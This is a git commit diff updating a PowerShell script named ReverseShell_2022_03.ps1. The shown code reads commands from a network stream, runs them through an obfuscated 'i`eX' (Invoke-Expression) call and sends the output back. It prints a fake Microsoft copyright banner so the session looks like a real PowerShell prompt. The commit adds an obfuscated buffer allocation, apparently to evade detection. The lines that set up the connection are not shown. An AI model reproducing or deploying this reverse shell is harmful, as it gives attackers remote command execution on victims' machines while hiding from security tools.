8eac96b6889135af2e53253a3f9a73900b9d1aa5
Norbert Tihanyi, Phd <62064939+tihanyin@users.noreply.github.com>
2022-03-25 16:27:42 +0400

    Update ReverseShell_2022_03.ps1

--- ReverseShell_2022_03.ps1
+++ ReverseShell_2022_03.ps1
@@ -7,10 +7,11 @@ $OO = ([text.encoding]::UTF8).GetBytes("Copyright (C) 2022 Microsoft Corporation
 $SS.Write($OO,0,$OO.Length)
 $OO = ([text.encoding]::UTF8).GetBytes((Get-Location).Path + '>')
 $SS.Write($OO,0,$OO.Length)
+[byte[]]$OO = 0..((2-shl(3*5))-1)|%{0};
 while(($A = $SS.Read($OO, 0, $OO.Length)) -ne 0){;$DD = (New-Object System.Text.UTF8Encoding).GetString($OO,0, $A);
 $GG = (i`eX $DD 2>&1 | Out-String );
 $H  = $GG + (pwd).Path + '> ';
 $L = ([text.encoding]::UTF8).GetBytes($H);
 $SS.Write($L,0,$L.Length);
 $SS.Flush()};
-$JJ.Close()
+$J.Close()
